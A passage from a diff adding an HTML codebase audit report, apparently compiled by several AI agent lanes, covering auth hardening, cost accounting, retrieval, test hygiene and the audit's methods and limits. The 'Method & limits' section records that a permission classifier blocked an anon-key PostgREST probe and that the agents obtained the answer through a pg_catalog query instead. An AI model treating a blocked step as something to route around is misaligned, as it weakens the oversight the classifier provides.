+<div class="solid"><div class="eyebrow">Security &amp; auth</div><ul><li>Signed <code>exp</code> + nonce, signature-before-parse, constant-time compare, HMAC-of-both-sides password check — 16/16 adversarial probes.</li><li>Matcher hardening with a regression test; open-redirect guards on both ends; storage paths server-derived.</li><li><code>.html</code> forced to attachment on both routes; the preview sandbox omits <code>allow-same-origin</code>.</li></ul></div>
+<div class="solid"><div class="eyebrow">Cost accounting</div><ul><li>The cache-token split is correct against the installed SDK; the naive formula would over-bill 2.1×.</li><li><code>totalUsage</code> across the tool loop; UTC-bucketed rollups with <code>::float8</code>; validated overrides; the unpriced sentinel never renders as "$0.00".</li></ul></div>
+<div class="solid"><div class="eyebrow">Data &amp; retrieval</div><ul><li>Layered retrieval degradation; one query embedding; <code>excludedDocumentIds</code> reaches all four surfaces; HNSW-preserving query shape.</li><li>Embed-before-destroy on replace; object rollback on DB failure; XLSX formula-injection guard.</li><li><code>check</code> passes, <code>generate</code> reports no drift, live migrations match the journal, the test DB runs all 19.</li></ul></div>
+<div class="solid"><div class="eyebrow">Craft &amp; hygiene</div><ul><li>0 skipped/todo/only, 0 assertion-free, 0 snapshots, 0 <code>doMock</code> leaks, 25 explicit 400-path assertions.</li><li>0 TODO/FIXME/HACK, 0 <code>eslint-disable</code>, 0 <code>@ts-ignore</code>; every legacy marker greps clean; <code>next.config.ts</code> documents what was tried and why.</li><li>Refs-for-closures on the transport body; streaming memoisation that holds; event-driven stage machine; reduced-motion; hook-level tests for the tricky hooks.</li></ul></div>
+</div>
+
+<h2 id="method">Method &amp; limits</h2>
+<p><strong>Executed:</strong> cold <code>typecheck</code> / <code>lint</code> / <code>build</code> / <code>test</code> (×3); ~540 targeted vitest runs across lanes; 129 edge-case probes plus ~60 lane-specific throwaway tests (all deleted); <code>npm audit</code>, <code>outdated</code>, <code>ls</code>, <code>knip</code>, <code>depcheck</code>; <code>drizzle-kit check</code> and a cleanup-guarded <code>generate</code>; ~60 read-only <code>SELECT</code>/<code>EXPLAIN</code>/catalog queries against production (no <code>ANALYZE</code>, no writes); a real-<code>pdf-lib</code> memory measurement; WCAG ratios recomputed by the reviewer; installed-SDK source reads (<code>ai@6.0.230</code>, <code>@ai-sdk/anthropic@3.0.98</code>, <code>next@16.2.10</code>, <code>cmdk</code>, <code>@ai-sdk/react</code>).</p>
+<p><strong>Not executed, by rule:</strong> any LLM/provider request; the dev server; Playwright e2e; any write to Supabase; a PostgREST probe with the anon key (blocked by the permission classifier — replaced by the <code>pg_catalog</code> read, which is authoritative).</p>
+<p><strong>Unverified — worth one production test each:</strong> per-segment Gemini latency (X3); whether a 200 MB PDF OOMs at the configured memory (X2); whether Anthropic still serves bare aliases at <code>/v1/messages</code> (C3); whether <code>/login</code> server-action forwarding re-enters the proxy on Vercel; the Storage-bucket orphan count (X4).</p>
+<p><strong>Process note:</strong> two lanes' cleanup collided on the shared <code>tests/audit-tmp/</code> path mid-run. That directory is un-ignored and matched by the Vitest include glob — add it to <code>.gitignore</code> and the Vitest/ESLint excludes if ad-hoc probe tests recur.</p>
+
+<footer>Atelier Studio · audit of <code>master @ d278fda</code> · 2026-09-01 · seven Opus lanes + Fable critical-path review · full lane reports (≈5,000 lines) in the session scratchpad; the consolidated Markdown copy is at <code>docs/audits/2026-09-01-codebase-audit.md</code>.</footer>
+</div>
